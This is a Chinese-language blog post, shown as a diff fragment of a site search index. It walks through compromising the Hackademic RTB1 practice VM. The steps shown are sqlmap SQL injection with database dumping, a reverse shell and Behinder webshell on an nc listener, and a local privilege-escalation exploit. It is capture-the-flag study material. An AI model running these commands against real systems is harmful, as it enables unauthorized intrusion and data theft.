+<p>尝试执行命令ls 发现报错，可能存在sql注入。完啦，忘了怎么弄。<img src="/images/image-20220130024020296.png" alt="image-20220130024020296"></p>
+<p>扫描目录吧</p>
+<p>dirb <a href="http://192.168.1.105/Hackademic_RTB1/">http://192.168.1.105/Hackademic_RTB1/</a> /usr/share/wordlists/dirb/big.txt<img src="/images/image-20220130031100871.png" alt="image-20220130031100871"></p>
+<p><img src="/images/image-20220130032035785.png" alt="image-20220130032035785"> 其他目录没有任何价值。回头使用sqlmap获取shell</p>
+<p>sqlmap -u <a href="http://192.168.1.105/Hackademic_RTB1/?cat=1">http://192.168.1.105/Hackademic_RTB1/?cat=1</a> --sql-shell</p>
+<p><img src="/images/image-20220130042554573.png" alt="image-20220130042554573"></p>
+<p>成功获取到shell。进行脱库<br>
+sqlmap -u <a href="http://192.168.1.105/Hackademic_RTB1/?cat=1">http://192.168.1.105/Hackademic_RTB1/?cat=1</a> --dbs --batch --dump</p>
+<p><img src="/images/image-20220130054635407.png" alt="image-20220130054635407"></p>
+<p><img src="/images/image-20220130054706696.png" alt="image-20220130054706696"> 登录等级10得账户GeorgeMiller ， q1w2e3</p>
+<p><img src="/images/image-20220130063556078.png" alt="image-20220130063556078"> 发现了可以写入网页，写入反弹shell和一句话冰蝎。nc -lvp 443  监听该端口</p>
+<p>whoami发现权限为apache准备提权</p>
+<h3 id="提权-3">提权</h3>
+<p>连接冰蝎</p>
+<p><img src="/images/image-20220130064222464.png" alt="image-20220130064222464"> <img src="/images/image-20220130063406301.png" alt="image-20220130063406301"></p>
+<p>上传15285.c  chmod +x 15285.c 赋予写入权限，运行提权</p>
+<p><img src="/images/image-20220130064327447.png" alt="image-20220130064327447"></p>
+<p>打开keytxt。<img src="/images/image-20220130064458791.png" alt="image-20220130064458791"> 完成。</p>
+<h3 id="总结-10">总结</h3>
+<p>对sql命令不熟悉。不会使用sqlshell写入马。没法到适合得提权方法，提权过程中失败三次，因为文件没找对。</p>
+]]></content>
+      <categories>
+        <category>靶机</category>
+      </categories>
+      <tags>
+        <tag>END 文章已结束</tag>
+      </tags>
+  </entry>
+</search>
